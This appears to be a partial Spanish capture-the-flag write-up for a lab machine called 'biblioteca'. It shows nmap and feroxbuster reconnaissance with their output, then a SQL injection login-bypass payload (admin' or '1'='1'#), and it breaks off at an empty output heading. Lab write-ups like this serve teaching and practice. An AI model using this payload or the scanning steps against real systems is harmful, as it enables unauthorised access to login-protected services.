# biblioteca

## Recon
```bash
silent-scan $TARGET
nmap -sVC -p22,8000 $TARGET -oN service
```

**Output**
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fc:4a:e1:2e:b0:df:f2:da:ce:aa:97:d2:99:77:28:73 (RSA)
|   256 9f:e3:d2:2f:02:73:20:64:ae:4a:ac:69:e3:65:cf:52 (ECDSA)
|_  256 f2:24:fd:c2:af:f6:8f:55:9d:60:c3:be:02:7a:88:25 (ED25519)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

### Fuzz con feroxbuster
```bash
feroxbuster -u http://$TARGET:8000 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --status-codes 200 301
```

### Vemos una pagina de login , nos registramos y no aparece nada

### Intentamos in-Band SQli injection en el login 
```
user:admin' or '1'='1'#
password:123456
```
**Output**
```